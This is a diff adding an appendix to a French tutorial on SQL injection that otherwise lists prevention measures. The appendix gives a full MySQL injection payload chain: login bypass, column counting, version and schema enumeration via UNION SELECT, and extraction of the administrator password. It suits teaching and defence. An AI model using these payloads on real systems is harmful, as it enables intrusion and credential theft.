@@ -188,3 +188,36 @@ L'injection SQL est une menace sérieuse pour la sécurité des applications web
 2. **Valider et nettoyer les entrées de l'utilisateur** : Assurez-vous que toutes les entrées de l'utilisateur sont correctement validées et nettoyées avant d'être utilisées dans des requêtes SQL.
 3. **Limiter les privilèges de la base de données** : Utilisez des comptes de base de données avec des privilèges limités pour les opérations spécifiques, et évitez d'utiliser des comptes avec des droits d'administrateur pour des tâches régulières.
 4. **Utiliser des outils de détection d'injections SQL** : Mettez en place des outils de détection et de prévention des intrusions pour identifier et bloquer les tentatives d'injection SQL.
+
+# Annexe 1  :
+```sql
+Injection SQL :
+
+' OR 1=1 #
+
+
+Obtenir le nombre de colonnes :
+
+' OR 1=1 order by x # (avec x=1,2,3, etc jusqu'à l'impossibilité de se connecter qui donnera le nbre de colonnes)
+
+
+Obtenir la version de la base de données :
+
+' OR 1=1 union select 0,@@version,2 order by id; #
+
+
+Obtenir le nom des tables :
+
+' OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #
+
+
+Obtenir le nom des colonnes de la table :
+
+' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #
+
+
+Obtenir le mot de passe de l'administrateur :
+
+' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #
+
+```
